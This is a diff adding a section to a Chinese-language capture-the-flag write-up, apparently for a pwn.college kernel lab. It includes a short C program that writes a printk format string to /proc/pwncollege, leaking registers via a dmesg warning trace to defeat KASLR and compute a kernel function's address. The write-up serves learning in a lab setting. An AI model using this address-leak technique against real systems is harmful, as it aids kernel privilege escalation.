@@ -260,3 +260,21 @@ int main() {
 }
 ```
 发现直接让`run_cmd`调用`cat /flag`会没有输出，于是想了这个办法
+
+### level10.0
+
+题目设置其实和`level9.0`一样，但这次开启了kaslr。需要泄漏地址从而计算run_cmd的地址
+
+题目原本执行的函数指针是printk。搜了一下文档，这玩意竟然支持格式化字符串： https://www.kernel.org/doc/html/latest/core-api/printk-formats.html 。试验了几个格式，发现常见的`%llx`等格式均无法泄漏有效的地址；但`%*phN`可以触发warning trace（用`dmesg`查看），从而dump出执行时的寄存器状态。巧的地方在于，RSI的值（以`850`结尾）和run_cmd的差值固定，为`19131680`。于是这次需要两个exp。首先触发dmesg：
+```c
+#include <fcntl.h>
+#include <unistd.h>
+#include <stdlib.h>
+int main() {
+    int fd = open("/proc/pwncollege", O_RDWR);
+    char shellcode[]="%*phN";
+    write(fd,shellcode,sizeof(shellcode)-1);
+    return 0;
+}
+```
+计算出run_cmd的地址后运行上一题的exp即可
